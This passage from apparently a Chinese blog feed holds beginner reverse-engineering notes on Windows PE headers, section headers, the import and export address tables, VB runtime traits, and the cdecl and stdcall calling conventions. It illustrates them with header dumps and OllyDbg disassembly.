<code>IMAGE_DATA_DIRECTORY</code> 结构体组成的数组，数组的每项都有被定义的值。</p><pre><code class="cpp">DataDirectory[0] = EXPORT DirectoryDataDirectory[1] = IMPORT DirectoryDataDirectory[2] = RESOURCE DirectoryDataDirectory[3] = EXCEPTION DirectoryDataDirectory[4] = SECURITY DirectoryDataDirectory[5] = BASERELOC DirectoryDataDirectory[6] = DEBUG DirectoryDataDirectory[7] = COPYRIGHT DirectoryDataDirectory[8] = GLOBALPTR DirectoryDataDirectory[9] = TLS DirectoryDataDirectory[A] = LOAD_CONFIG DirectoryDataDirectory[B] = BOUND_IMPORT DirectoryDataDirectory[C] = IAT DirectoryDataDirectory[D] = DELAY_IMPORT DirectoryDataDirectory[E] = COM_DESCRIPTOR DirectoryDataDirectory[F] = Reserved Directory</code></pre><p>将此处所说的 <code>Directory</code> 想成某个结构体数组即可。比较重要的是<code>EXPORT/IMPORT/RESOURCE</code>、<code>TLS Direction</code>。</p><h4 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h4><p><code>IMAGE_OPTIONAL_HEADER</code> 整个结构体。</p><p><img src="/pics/BIN集训/RE/三/7.png" srcset="/img/loading.gif" alt></p><p>结构体各成员的值及其说明如下。</p><pre><code>[ IMAGE_OPTIONAL_HEADER ] - notepad.exe offset   value   description--------------------------------------------------------------------------000000F8     010B magic000000FA       07 major liinker version000000FB       0A minor liinker version000000FC 00007800 size of code00000100 00008C00 size of initialized data00000104 00000000 size of uninitialized data00000108 0000739D address of entry point0000010C 00001000 base of code00000110 00009000 base of data00000114 01000000 image base00000118 00001000 section alignment0000011C 00000200 file alignment00000120     0005 major OS version00000122     0001 minor OS version00000124     0005 major image version00000126     0001 minor image version00000128     0004 major subsystem version0000012A     0000 minor subsystem version0000012C 00000000 win32 version value00000130 00014000 size of image00000134 00000400 size of headers00000138 000126CE Checksum0000013C     0002 subsystem0000013E     8000 DLL characteristics00000140 00040000 size of stack reserve00000144 00011000 size of stack commit00000148 00100000 size of heap reserve0000014C 00001000 size of heap commit00000150 00000000 loader flags00000154 00000010 number of directories00000158 00000000 RVA  of EXPORT Directory0000015C 00000000 size of EXPORT Directory00000160 00007604 RVA  of IMPORT Directory00000164 000000C8 size of IMPORT Directory00000168 00000000 RVA  of RESOURCE Directory0000016C 00008304 size of RESOURCE Directory00000170 00000000 RVA  of EXCEPTION Directory00000174 00000000 size of EXCEPTION Directory00000178 00000000 RVA  of SECURITY Directory0000017C 00000000 size of SECURITY Directory00000180 00000000 RVA  of BASERELOC Directory00000184 00000000 size of BASERELOC Directory00000188 00001350 RVA  of DEBUG Directory0000018C 0000001C size of DEBUG Directory00000190 00000000 RVA  of COPYRIGHT Directory00000194 00000000 size of COPYRIGHT Directory00000198 00000000 RVA  of GLOBALPTR Directory0000019C 00000000 size of GLOBALPTR Directory000001A0 00000000 RVA  of TLS Directory000001A4 00000000 size of TLS Directory000001A8 000018A8 RVA  of LOAD_CONFIG Directory000001AC 00000040 size of LOAD_CONFIG Directory000001B0 00000250 RVA  of BOUND_IMPORT Directory000001B4 000000D0 size of BOUND_IMPORT Directory000001B8 00001000 RVA  of IAT Directory000001BC 00000348 size of IAT Directory000001C0 00000000 RVA  of DELAY_IMPORT Directory000001C4 00000000 size of DELAY_IMPORT Directory000001C8 00000000 RVA  of COM_DESCRIPTOR Directory000001CC 00000000 size of COM_DESCRIPTOR Directory000001D0 00000000 RVA  of Reserved Directory000001D4 00000000 size of Reserved Directory</code></pre><h3 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h3><p>节区头中定义了各节区属性。前面提到过，PE 文件中的 code（代码）、data（数据）、resource（资源）等按照属性分类存储在不同节区。</p><p>把 PE 文件创建成多个节区结构的好处是可以保证程序的安全性。若把 code 与 data 放在一个节区中相互纠缠很容易引发安全问题，即使忽略过程的烦琐。</p><p>假如向字符串 data 写数据时，由于某个原因导致溢出（输入超过缓冲区大小时），那么其下的 code（指令）就会被覆盖，应用程序就会崩溃。因此，PE 文件格式的设计者们决定把具有相似属性的数据统一保存在一个被称为 “节区” 的地方，然后需要把各节区属性记录在节区头中（节区属性中有文件/内存的起始位置、大小、访问权限等）。</p><p>换言之，需要为每个 code/data/resource 分别设置不同的特性、访问权限等，如下表。</p><table><thead><tr><th style="text-align:center">类别</th><th style="text-align:center">访问权限</th></tr></thead><tbody><tr><td style="text-align:center">code</td><td style="text-align:center">执行，读取权限</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">非执行，读写权限</td></tr><tr><td style="text-align:center">resource</td><td style="text-align:center">非执行，读取权限</td></tr></tbody></table><h4 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h4><p>节区头是由 <code>IMAGE_SECTION_HEADER</code> 结构体组成的数组，每个结构体对应一个节区。</p><pre><code class="cpp"># define IMAGE_SIZEOF_SHORT_NAME 8typedef struct _IMAGE_SECTION_HEADER {    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];  // 区块的名称，如 “.text”    union {            DWORD   PhysicalAddress;        // 物理地址            DWORD   VirtualSize;            // 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个    } Misc;    DWORD   VirtualAddress;                 // 节区的 RVA 地址    DWORD   SizeOfRawData;                  // 在文件中对齐后的尺寸    DWORD   PointerToRawData;               // 在文件中的偏移量    DWORD   PointerToRelocations;           // 在 OBJ 文件中使用，重定位的偏移    DWORD   PointerToLinenumbers;           // 行号表的偏移（供调试使用地)    WORD    NumberOfRelocations;            // 在 OBJ 文件中使用，重定位项数目    WORD    NumberOfLinenumbers;            // 行号表中行号的数目    DWORD   Characteristics;                // 节属性如可读，可写，可执行等} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</code></pre><p>下表中列出了 <code>IMAGE_SECTION_HEADER</code> 结构体中要了解的重要成员（不使用其他成员）。</p><table><thead><tr><th style="text-align:center">项目</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>VirtualSize</code></td><td style="text-align:center">内存中节区所占大小</td></tr><tr><td style="text-align:center"><code>VirtualAddress</code></td><td style="text-align:center">内存中节区起始地址（RVA）</td></tr><tr><td style="text-align:center"><code>SizeOfRawData</code></td><td style="text-align:center">磁盘文件中节区所占大小</td></tr><tr><td style="text-align:center"><code>PointerToRawData</code></td><td style="text-align:center">磁盘文件中节区起始位置</td></tr><tr><td style="text-align:center"><code>Characteristics</code></td><td style="text-align:center">节区属性（bit OR）</td></tr></tbody></table><p><code>VirtualAddress</code> 与 <code>PointerToRawData</code> 不带有任何值，分别由（定义在 <code>IMAGE_OPTIONAL_HEADER32</code> 中的）<code>SectionAlignment</code> 与 <code>FileAlignment</code> 确定。</p><p><code>VirutalSize</code> 与 <code>SizeOfRawData</code> 一般具有不同的值，即磁盘文件中节区的大小与加载到内存中的节区大小是不同的。</p><p><code>Characteristics</code> 由以下代码中现实的值组合（bit OR）而成。</p><pre><code class="cpp">#define IMAGE_SCN_CNT_CODE                0x00000020 // Section contains code.#define IMAGE_SCN_CNT_INITIALIZED_DATA    0x00000040 // Section contains initialized data.#define IMAGE_SCN_CNT_UNINITIALIZED_DATA  0x00000080 // Section contains uninitialized data.#define IMAGE_SCN_MEM_EXECUTE             0x20000000 // Section is executable.#define IMAGE_SCN_MEM_READ                0x40000000 // Section is readable.#define IMAGE_SCN_MEM_WRITE               0x80000000 // Section is writable.</code></pre><p>最后讲一下 Name 字段。Name 成员不像 C 语言中的字符串一样以 NULL 结束，并且没有 “必须使用 ASCII 值” 的限制。PE 规范未明确规定节区的 Name，所以可以向其中仿佛任何值，甚至可以填充 NULL 值。所以节区的 Name 仅供参考，不能保证其百分之百地被用作某种信息（数据节区的名称也可叫做 <code>.code</code>）。</p><p><img src="/pics/BIN集训/RE/三/8.png" srcset="/img/loading.gif" alt></p><p>各结构体成员如下。</p><pre><code>[ IMAGE_SECTION_HEADER ] offset   value   description--------------------------------------------------------------------------000001D8 2E746578 Name (.text)000001DC 74000000000001E0 00007748 virtual size000001E4 00001000 RVA000001E8 00007800 size of raw data000001EC 00000400 offset to raw data000001F0 00000000 offset to relocations000001F4 00000000 offset to line numbers000001F8     0000 number of relocations000001FA     0000 number of line numbers000001FC 60000020 characteristics                    IMAGE_SCN_CNT_CODE                    IMAGE_SCN_MEM_EXECUTE                    IMAGE_SCN_MEM_READ00000200 2E646174 Name (.data)00000204 6100000000000208 00001BA8 virtual size0000020C 00009000 RVA00000210 00000800 size of raw data00000214 00007C00 offset to raw data00000218 00000000 offset to relocations0000021C 00000000 offset to line numbers00000220     0000 number of relocations00000222     0000 number of line numbers00000224 C0000040 characteristics                    IMAGE_SCN_CNT_INITIALIZED_DATA                    IMAGE_SCN_MEM_READ                    IMAGE_SCN_MEM_WRITE00000228 2E727372 Name (.rsrc)0000022C 6300000000000230 00008304 virtual size00000234 0000B000 RVA00000238 00008400 size of raw data0000023C 00008400 offset to raw data00000240 00000000 offset to relocations00000244 00000000 offset to line numbers00000248     0000 number of relocations0000024A     0000 number of line numbers0000024C 40000040 characteristics                    IMAGE_SCN_CNT_INITIALIZED_DATA                    IMAGE_SCN_MEM_READ</code></pre><blockquote><p>讲解 PE 文件时经常出现 “映像” （Image）这一术语。PE 文件加载到内存时，文件不会原封不动地加载，而要根据节区头中定义的节区起始地址、节区大小等加载。因此，磁盘文件中的 PE 与内存中的 PE 具有不同形态。将装载到内存中的形态称为 “映像” 以示区别。</p></blockquote><h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p>PE 文件加载到内存时，每个节区都要能准确完成内存骶椎与文件偏移间的映射。这种映射一般称为 RVA to RAW，方法如下。</p><ol><li>查找 RVA 所在节区。</li><li>使用简单的公式计算文件偏移（RAW）。</li></ol><p>根据 <code>IMAGE_SECTION_HEADER</code> 结构体，换算公式如下：</p><pre><code>RAW - PointerToRawData = RVA - VirtualAddress                   RAW = RVA - VirtualAddress + PointerToRawData</code></pre><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>IAT（Import Address Table，导入地址表）保存的内容与 Windows 操作系统的核心进程、内存、DLL 结构等有关。换句话说，只要理解了 IAT，就掌握了 Windows 操作系统的根基。简言之 IAT 是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p><blockquote><p>RVA 与 RAW（文件偏移）间的相互变换是 PE 头的最基本的内容。</p></blockquote><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>DLL（Dynamic Linked Library）撑起了整座 Windows OS 大厦，它被翻译成 “动态链接库”。</p><p>16 位的 DOS 时代不存在 DLL 这一概念，只有 “库”（Library）一说。比如在 C 语言中使用 <code>printf()</code> 函数时，编译器会先从 C 库中读取相应函数的二进制代码，然后插入（包含到）应用程序。也就是说，可执行文件中包含着 <code>printf()</code> 函数的二进制代码。Windows OS 支持多任务，若仍采用这种包含库的方式，会非常没有效率。Windows 操作系统使用了数量庞大的库函数（进程、内存、窗口、消息等）来支持 32 位的 Windows 环境。同时运行多个程序时，若仍像以前一样每个程序运行时都包含相同的库，将造成严重的内存浪费（当然磁盘空间的浪费也不容小嘘）。因此，Windows OS 设计者们根据需要引入了 DLL 这一概念，描述如下。</p><ul><li>不要把库包含到程序中，单独组成 DLL 文件，需要时调用即可。</li><li>内存映射技术使加载后的 DLL 代码、资源在多个进程中实现共享。</li><li>更新库时只要替换相关 DLL 文件即可，简便易行。</li></ul><p>加载 DLL 的方式实际有两种：一种是 “显式链接”（Explicit Linking），程序使用 DLL 时加载，使用完毕后释放内存；另一种是 “隐式链接”（Implicit Linking），程序开始时即一同加载 DLL，程序终止时再释放占用的内存。IAT 提供的机制即与隐式链接有关。接下来用 OllyDbg 打开 <code>notepad.exe</code> 来查看 IAT，下图是 <code>CreateFileW()</code> 函数的代码，该函数位于 kernel32.dll 中。</p><p><img src="/pics/BIN集训/RE/三/9.png" srcset="/img/loading.gif" alt></p><p>调用 <code>CreateFileW()</code> 函数时并非直接调用，而是通过获取 01001104 地址处的值来实现（所有 API 调用均采用这种方式）。</p><p>地址 01001104 是 <code>notepad.exe</code> 中 <code>.text</code> 节区的内存区域（更确切地说是 IAT 内存区域）。01001104 地址的值为 7C8107F0，而 7C8107F0 地址即是加载到 <code>notepad.exe</code> 进程内存中的 <code>CreateFileW()</code> 函数（位于 kernel32.dll 库中）的地址。</p><p>那么为什么不直接 <code>CALL 7C8107F0</code> 呢？事实上，<code>notepad.exe</code> 程序的制作者编译（生成）程序时，并不知道该 <code>notepad.exe</code> 程序运行在哪种 Windows（9X、2K、XP、Vista、7 等）、哪种语言（ENG、JPN、KOR 等）、哪种服务包（Service Pack）下。上面列举出的所有环境中，kernel32.dll 的版本各不相同，<code>CreateFileW()</code> 函数的位置（地址）也不相同。为了确保在所有环境中都能正常地调用 <code>CreateFileW()</code> 函数，编译器准备了要保存 <code>CreateFileW()</code> 函数实际地址的位置（01001104），并记下 <code>CALL DWORD PTR DS:[01001104]</code> 形式的指令。执行文件时，PE 装载器将 <code>CreateFileW()</code> 函数的地址写到 01001104 位置。</p><p>编译器不使用 <code>CALL 7C8107F0</code> 语句的另一个原因在于 DLL 重定位。DLL 文件的 ImageBase 值一般为 10000000。比如某个程序使用 a.dll 与 b.dll 时，PE 装载器先把 a.dll 装载到内存的 10000000（ImageBase）处，然后尝试把 b.dll 也装载到该处。但是由于该地址处已经装载了 a.dll，所以 PE 装载器查找其他空白的内存空间（ex：3E000000），然后将 b.dll 装载进去。</p><p>这就是所谓的 DLL 重定位，它使我们无法对实际地址硬编码。另一个原因在于，PE 头中表示地址时不使用 VA，而是 RVA。</p><blockquote><p>实际操作中无法保证 DLL 一定会被加载到 PE 头内指定的 ImageBase 处。但是 EXE 文件（生成进程的主体）却能准确加载到自身的 ImageBase 中，因为它拥有自己的虚拟空间。</p></blockquote><p>PE 头的 IAT 是代码逆向分析的核心内容。</p><h3 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h3><p><code>IMAGE_IMPORT_DESCRIPTOR</code> 结构体中记录着 PE 文件要导入哪些库文件。</p><blockquote><p>Import：导入，向库提供服务（函数）。<br>Export：导出，从库向其他 PE 文件提供服务（函数）。</p></blockquote><p><code>IMAGE_IMPORT_DESCRIPTOR</code> 结构体如下所示。</p><pre><code class="cpp">typedef struct _IMAGE_IMPORT_DESCRIPTOR {    union {        DWORD   Characteristiics;        DWORD   OriginalFirstThunk;     // INT(Import Name Table) address (RVA)    }    DWORD   TimeDateStamp;    DWORD   ForwarderChain;    DWORD   Name;                       // library name string address (RVA)    DWORD   FirstThunk;                 // IAT(Import Address Table) address (RVA)} IMAGE_IMPORT_DESCRIPTOR;typedef struct _IMAGE_IMPORTBY_NAME {    WORD    Hint;                       // ordinal    BYTE    Name[1];                    // function name string} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</code></pre><p>执行一个普通程序时往往需要导入多个库，导入多少库就存在多少个 <code>IMAGE_IMPORT_DESCRIPTOR</code> 结构体，这些结构体形成了数组，且结构体数组最后以 NULL 结构体结束。<code>IMAGE_IMPORT_DESCRIPTOR</code> 中重要的成员如下表所示（拥有全部 RVA 值）。</p><table><thead><tr><th style="text-align:center">项目</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">OriginalFirstThunk</td><td style="text-align:center">INT 的地址（RVA）</td></tr><tr><td style="text-align:center">Name</td><td style="text-align:center">库名称字符串的地址（RVA）</td></tr><tr><td style="text-align:center">FirstThunk</td><td style="text-align:center">IAT 的地址（RVA）</td></tr></tbody></table><blockquote><p>PE 头中提到的 “Table” 即指数组。<br>INT 与 IAT 是长整型（4 个字节数据类型）数组，以 NULL 结束（未另外明确指出大小）。<br>INT 中各元素的值为 IMAGE_IMPORT_BY_NAME 结构体指针（有时 IAT 也拥有相同的值）。<br>INT 与 IAT 的大小应相同。</p></blockquote><p>下图为 <code>notepad.exe</code> 之 kernel32.dll 的 <code>IMAGE_IMPORT_DESCRIPTOR</code> 结构。</p><p><img src="/pics/BIN集训/RE/三/10.png" srcset="/img/loading.gif" alt></p><p>INT 与 IAT 的各元素同时指向相同地址，但也有很多情况下它们是不一致的。</p><p>下面为 PE 装载器把导入函数输入之 IAT 的顺序。</p><ol><li>读取 IID 的 Name 成员，获取库名称字符串（“kernel32.dll”）。</li><li>装载相应库。-&gt; <code>LoadLibrary(&quot;kernel32.dll&quot;)</code></li><li>读取 IID 的 OriginialFirstThunk 成员，获取 INT 地址。</li><li>逐一读取 INT 中数组的值，获取相应 IMAGE_IMPORT_BY_NAME 地址（RVA）。</li><li>使用 IMAGE_IMPORT_BY_NAME 的 Hint（ordinal）或 Name 项，获取相应函数的起始地址。-&gt; <code>GetProcAddress(&quot;GetCurrentThreadld&quot;)</code></li><li>读取 IID 的 FirstThunk（IAT）成员，获得 IAT 地址。</li><li>将上面获得的函数地址输入相应 IAT 数组值。</li><li>重复以上步骤 4~7，直到 INT 结束（遇到 NULL 时）。</li></ol><h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h2><p>Windows 操作系统中，“库” 是为了方便其他程序调用而集中包含相关函数的文件（DLL/SYS）。Win32 API 是最具代表性的库，其中的 kernel32.dll 文件被称为最核心的库文件。</p><p>EAT 是一种核心机制，它使不同应用程序可以调用库文件中提供的函数。也就是说，只有通过 EAT 才能准确求得从相应库中导出函数的起始地址。与 IAT 一样，PE 文件内的特定结构体（<code>IMAGE_EXPORT_DIRECTORY</code>）保存着导出信息，且 PE 文件中仅有一个用来说明库 EAT 的 <code>IMAGE_EXPORT_DIRECTORY</code> 结构体。</p><blockquote><p>用来说明 IAT 的 IMAGE_IMPORT_DESCRIPTOR 结构体以数组形式存在，且拥有多个成员。这样是因为 PE 文件可以同时导入多个库。</p></blockquote><p>可以在 PE 文件的 PE 头查找到 <code>IMAGE_EXPORT_DIRECTORY</code> 结构体的位置。<code>IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress</code> 值即是 <code>IMAGE_EXPORT_DIRECTORY</code> 的起始地址（也是 RVA 的值）。</p><p>下图显示的是 kernel32.dll 文件的 <code>IMAGE_OPTIONAL_HEADER32.DataDirectory[0]</code>（第一个 4 字节为 VirtualAddress，第二个 4 字节为 Size 成员）。</p><p><img src="/pics/BIN集训/RE/三/11.png" srcset="/img/loading.gif" alt></p><p><code>IMAGE_OPTIONAL_HEADER32.DataDirectory</code> 结构体数组信息整理如下表。</p><table><thead><tr><th style="text-align:center">偏移</th><th style="text-align:center">值</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">00000160</td><td style="text-align:center">00000000</td><td style="text-align:center">loader flags</td></tr><tr><td style="text-align:center">00000164</td><td style="text-align:center">00000010</td><td style="text-align:center">number of directories</td></tr><tr><td style="text-align:center">00000168</td><td style="text-align:center">0000262C</td><td style="text-align:center">RVA of EXPORT Directory</td></tr><tr><td style="text-align:center">0000016C</td><td style="text-align:center">00006D19</td><td style="text-align:center">size of EXPORT Directory</td></tr><tr><td style="text-align:center">00000170</td><td style="text-align:center">00081898</td><td style="text-align:center">RVA of IMPORT Directory</td></tr><tr><td style="text-align:center">00000174</td><td style="text-align:center">00000028</td><td style="text-align:center">size of IMPORT Directory</td></tr></tbody></table><p>由于 RVA 值为 262C，所以文件偏移为 1A2C。</p><h3 id="IMAGE-EXPORT-DIRECTORY"><a href="#IMAGE-EXPORT-DIRECTORY" class="headerlink" title="IMAGE_EXPORT_DIRECTORY"></a>IMAGE_EXPORT_DIRECTORY</h3><p><code>IMAGE_EXPORT_DIRECTORY</code> 结构体如下。</p><pre><code class="cpp">typedef struct _IMAGE_EXPORT_DIRECTORY {    DWORD   Characteristics;    DWROD   TimeDateStamp;          // creation time date stamp    WORD    MajorVersion;    WORD    MinorVersion;    DWORD   Name;                   // address of library file name    DWORD   Base;                   // ordinal base    DWORD   NumberOfFunctions;      // number of functions    DWORD   NumberOfNames;          // number of names    DWORD   AddressOfFunctions;     // address of function start address array    DWORD   AddressOfNames;         // address of function name string array    DWORD   AddressOfNameOrdinals;  // address of ordinal array} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</code></pre><p>下表为其中的重要成员（全部地址均为 RVA）。</p><table><thead><tr><th style="text-align:center">项目</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">NumberOfFunctions</td><td style="text-align:center">实际 Export 函数的个数</td></tr><tr><td style="text-align:center">NumberOfNames</td><td style="text-align:center">Export 函数中具名的函数个数</td></tr><tr><td style="text-align:center">AddressOfFunctions</td><td style="text-align:center">Export 函数地址数组（数组元素个数=AddressOfFunctions）</td></tr><tr><td style="text-align:center">AddressOfNames</td><td style="text-align:center">函数名称地址数组（数组元素个数=AddressOfNames）</td></tr><tr><td style="text-align:center">AddressOfNameOrdinals</td><td style="text-align:center">Ordinal 地址数组（数组元素个数=AddressOfNames）</td></tr></tbody></table><p>下图是 kernel32.dll 文件的 <code>IMAGE_EXPORT_DIRECTORY</code> 结构体与整个 EAT 结构。</p><p><img src="/pics/BIN集训/RE/三/12.jpeg" srcset="/img/loading.gif" alt></p><p>从库中获得函数地址的 API 为 <code>GetProcAddress()</code> 函数。该 API 引用 EAT 来获取指定 API 的地址。<code>GetProcAddress()</code> API 拥有函数名称，以下为它获取函数地址的过程。</p><ol><li>利用 AddressOfNames 成员转到 “函数名称数组”。</li><li>“函数名称数组” 中存储着字符串地址。通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为 name_index）。</li><li>利用 AddressOfNameOrdinals 成员，转到 ordinal 数组。</li><li>在 ordinal 数组中通过 name_index 查找相应的 ordinal 值。</li><li>利用 AddressOfFunctions 成员转到 “函数地址数组”（EAT）。</li><li>在 “函数地址数组” 中将刚刚求得的 ordinal 用作数组索引，获得指定函数的起始地址。</li></ol><p>kernel32.dll 中所有导出函数均有相应名称，AddressOfNameOrdinals 数组的值以 index=ordinal 的形式存在。但并不是所有的 DLL 文件都如此。导出函数中也有一些函数没有名称（仅通过 ordinal 导出），AddressOfNameOrdinals 数组的值为 index!=ordinal。所以只有按照上面的顺序才能获得准确的函数地址。</p><blockquote><p>对于没有函数名称的导出函数，可以通过 Ordinal 查找到它们的地址。从 Ordinal 值中减去 IMAGE_EXPORT_DIRECTORY.Base 成员后得到一个值，使用该值作为 “函数地址数组” 的索引，即可查找到相应函数的地址。</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://reversecore.com/" target="_blank" rel="noopener">《逆向工程核心原理》</a><br><a href="https://bbs.pediy.com/thread-247114.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247114.htm</a><br><a href="https://bbs.pediy.com/thread-247303.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247303.htm</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RE入门（二）</title>
    <link href="/2019/01/27/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2019/01/27/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>了解一些 VB 的特性以及一些简单的的函数调用约定。</p><a id="more"></a><h1 id="Visual-Basic"><a href="#Visual-Basic" class="headerlink" title="Visual Basic"></a>Visual Basic</h1><h2 id="VB-专用引擎"><a href="#VB-专用引擎" class="headerlink" title="VB 专用引擎"></a>VB 专用引擎</h2><p>VB 文件使用名为 <code>MSVBVM60.dll</code>（Microsoft Visual Basic Machine 6.0）的 VB 专用引擎（也称为 The Thunder Runtime Engine）。</p><p>举个使用 VB 引擎的例子，显示消息框时，VB 代码中要调用 <code>MsgBox()</code> 函数。其实，VB 编辑器真正调用的是 <code>MSVBVM60.dll</code> 里的 <code>rtcMsgBox()</code> 函数，在该函数内部通过调用 <code>user32.dll</code> 里的 <code>MessageBoxW()</code> 函数（Win32 API）来工作（也可以在 VB 代码中直接调用 <code>user32.dll</code> 里的 <code>MessageBoxW()</code>）。</p><h2 id="本地代码和伪代码"><a href="#本地代码和伪代码" class="headerlink" title="本地代码和伪代码"></a>本地代码和伪代码</h2><p>根据使用的编译选项的不同，VB 文件可以编译为本地代码（N code）与伪代码（P code）。本地代码一般使用易于调试器解析的 IA-32 指令；而伪代码是一种解释器（Interpreter）语言，它使用由 VB 引擎实现虚拟机并可自解析的指令（字节码）。因此，若想准确解析 VB 的伪代码，就需要分析 VB 引擎并实现模拟器。</p><p>伪代码具有与 Java（Java 虚拟机）、Python（Python 专用引擎）类似的形态结构。使用伪代码的好处是非常方便代码移植（编写/发布针对特定平台的引擎，用户代码借助它几乎可以不加任何修改地在制定平台上运行）。</p><h2 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h2><p>VB 主要来编写 GUI 程序，IDE 用户界面本身也最适合于 GUI 编程。由于 VB 程序采用 Windows 操作系统的事件驱动方式工作，所以在 <code>main()</code> 或 <code>WinMain()</code> 中并不存在用户代码（希望调试的代码），用户代码存在于各个事件处理程序（event handler）之中。</p><h1 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h1><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><p><code>cdecl</code> 是主要在 C 语言中使用的方式，调用者负责处理栈。</p><pre><code class="cpp">#include &quot;stdio.h&quot;int add(int a, int b){    return (a + b);}int main(int argc, char *argv[]){    return add(1, 2);}</code></pre><p>使用 VC++（关闭优化选项）编译代码生成 <code>cdecl.exe</code>，使用 OllyDbg 调试。</p><p>从 401000~401020 地址间的代码可以发现，<code>add()</code> 函数的参数 1、2 以逆序的方式入栈，调用 <code>add()</code> 函数（401000）后，使用 <code>ADD ESP,8</code> 命令整理栈。调用者 <code>main()</code> 函数直接清理其压入栈的函数参数，这样的方式是 <code>cdecl</code>。</p><pre><code>00401000  /$  55            PUSH EBP                                 ;  # add00401001  |.  8BEC          MOV EBP,ESP00401003  |.  8B45 08       MOV EAX,[ARG.1]00401006  |.  0345 0C       ADD EAX,[ARG.2]00401009  |.  5D            POP EBP0040100A  \.  C3            RETN0040100B      CC            INT30040100C      CC            INT30040100D      CC            INT30040100E      CC            INT30040100F      CC            INT300401010  /$  55            PUSH EBP                                 ;  # main00401011  |.  8BEC          MOV EBP,ESP00401013  |.  6A 02         PUSH 0x2                                 ;  / Arg2 = 0000000200401015  |.  6A 01         PUSH 0x1                                 ;  | Arg1 = 0000000100401017  |.  E8 E4FFFFFF   CALL cdecl.00401000                      ;  \ cdecl.004010000040101C  |.  83C4 08       ADD ESP,0x80040101F  |.  5D            POP EBP00401020  \.  C3            RETN</code></pre><p><code>cdecl</code> 方式的好处在于它可以像 C 语言的 <code>printf()</code> 函数一样，向被调用函数传递长度可变的参数。这种长度可变的参数在其他调用约定中很难实现。</p><h1 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h1><p><code>stdcall</code> 方式常用于 Win32 API，该方式由被调用者清理栈。C 语言默认的函数调用方式为 <code>cdecl</code>。若想使用 <code>stdcall</code> 方式编译源码，只要使用 <code>_stdcall</code> 关键字即可。</p><pre><code class="cpp">#include &quot;stdio.h&quot;int _stdcall add(int a, int b){    return (a + b);}int main(int argc, char *argv[]){    return add(1, 2);}</code></pre><p>使用 VC++（关闭优化选项）编译代码生成 <code>stdcall.exe</code> 文件后，使用 OllyDbg 调试。从代码中可以看到，在 <code>main()</code> 函数中调用 <code>add()</code> 函数后，省略了清理栈的代码（<code>ADD ESP,8</code>）。</p><p>栈的清理工作由 <code>add()</code> 函数中最后（40100A）的 <code>RETN 8</code> 命令来执行。<code>RETN 8</code> 命令的含义为 RETN + POP 8 字节，即返回后使 ESP 增加到指定大小。</p><pre><code>00401000  /$  55            PUSH EBP                                 ;  # add00401001  |.  8BEC          MOV EBP,ESP00401003  |.  8B45 08       MOV EAX,[ARG.1]00401006  |.  0345 0C       ADD EAX,[ARG.2]00401009  |.  5D            POP EBP0040100A  \.  C2 0800       RETN 0x80040100D      CC            INT30040100E      CC            INT30040100F      CC            INT300401010  /$  55            PUSH EBP                                 ;  # main00401011  |.  8BEC          MOV EBP,ESP00401013  |.  6A 02         PUSH 0x2                                 ;  / Arg2 = 0000000200401015  |.  6A 01         PUSH 0x1                                 ;  | Arg1 = 0000000100401017  |.  E8 E4FFFFFF   CALL stdcall.00401000                    ;  \ stdcall.004010000040101C  |.  5D            POP EBP0040101D  \.  C3            RETN</code></pre><p>像这样在被调用者 <code>add()</code> 函数内部清理栈的方式即为 <code>stdcall</code> 方式。<code>stdcall</code> 方式的好处在于，被调用者函数内部存在着栈清理代码，与每次调用函数时都要用 <code>ADD ESP,XXX</code> 命令的 <code>cdecl</code> 方式相比，代码尺寸要小。虽然 Win32 API 是使用语言编写的库，但它使用的是 <code>stdcall</code> 方式，而不是 C 语言默认的 <code>cdecl</code> 方式。这是为了更好的兼容性，使 C 语言之外的其他语言（Delphi（Pascall）、Visual Basic 等）也能直接调用 API。</p><h1 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h1><p><code>fastcall</code> 方式与 <code>stdcall</code> 